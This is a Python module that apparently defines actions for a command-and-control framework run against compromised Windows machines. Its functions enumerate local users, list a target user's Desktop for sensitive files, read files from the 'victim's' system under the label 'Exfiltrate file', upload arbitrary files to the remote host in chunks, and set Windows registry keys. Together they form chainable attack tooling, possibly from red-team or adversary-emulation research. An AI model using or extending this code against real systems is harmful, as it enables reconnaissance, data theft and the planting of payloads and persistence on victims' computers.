import os
from c2.c2_actions import C2Action
import c2.concrete_parsers as c2parsers


def find_local_users():
    commands_list = ["dir \\??\\C:\\Users\\"]
    parser = c2parsers.local_users_parser
    required_facts = []
    name = "Find local users"
    description = "Get a list of non-default local users"
    output_facts = ['local_users', 'target_local_user']
    action = C2Action(commands_list, parser, required_facts, name, description, output_facts)
    return action


def list_target_local_user_desktop():
    commands_list = ["dir \\??\\C:\\Users\\{target_local_user}\\Desktop\\"]
    parser = c2parsers.generic_dir_parser
    required_facts = ['target_local_user']
    name = "List user desktop"
    description = "Find potentially sensitive files on target user's desktop"
    output_facts = ['staged_files', 'target_file']
    action = C2Action(commands_list, parser, required_facts, name, description, output_facts)
    return action


def read_file():
    commands_list = ["read {target_file}"]
    parser = c2parsers.generic_file_parser
    required_facts = ['target_file']
    name = "Exfiltrate file"
    description = "Read a file from the victim's file system"
    action = C2Action(commands_list, parser, required_facts, name, description)
    return action


def get_system_version():
    commands_list = ["version"]
    parser = c2parsers.version_parser
    required_facts = []
    name = "Get system version"
    description = "Get major version, minor version and build number"
    output_facts = ['major_version', 'minor_version', 'build_number']
    action = C2Action(commands_list, parser, required_facts, name, description, output_facts)
    return action


def write_file(filename=None):
    commands_list = ["write {target_file}"]
    if filename is None:
        commands_list.append(b"stub")
    else:
        filename = filename.split('/')[-1]
        with open(os.path.join('/usr/src/app/c2/connections/upload_dir', filename), 'rb') as f:
            data = f.read()
        chunk_size = 1460
        data = [data[i:i + chunk_size] for i in range(0, len(data), chunk_size)]
        for chunk in data:
            commands_list.append(chunk)
    parser = c2parsers.null_parser
    required_facts = ['target_file']
    name = "Write file on remote file system"
    description = "This action reads a file, specified as argument, from the upload_dir, " \
                  "and writes it to remote file system in the path specified by target_file; " \
                  "if the local file is not specified, the action will write 'stub'"
    action = C2Action(commands_list, parser, required_facts, name, description)
    return action


def set_registry_key(key=None, subkey_name=None, subkey_type=None, subkey_value=None):
    args = [key, subkey_name, subkey_type, subkey_value]
    commands_list = [f"setkey {key}" if key is not None else "setkey {reg_key}",
                     subkey_name or "{reg_subkey_name}",
                     subkey_type or "{reg_subkey_type}",
                     subkey_value or "{reg_subkey_value}"]
    parser = c2parsers.null_parser
    complete_required_facts = ['reg_key', 'reg_subkey_name', 'reg_subkey_type', 'reg_subkey_value']
    required_facts = [complete_required_facts[i] for i in range(len(args)) if args[i] is None]
    name = "Set subkey name, type and value in a registry key"
    description = "Open/create a key in the Windows registry, and for that key sets a " \
                  "subkey with specified name, type and value; you can either start this action" \
                  " using facts or passing positional parameters: " \
                  "key_name subkey_name subkey_type subkey_value"
    action = C2Action(commands_list, parser, required_facts, name, description)
    return action
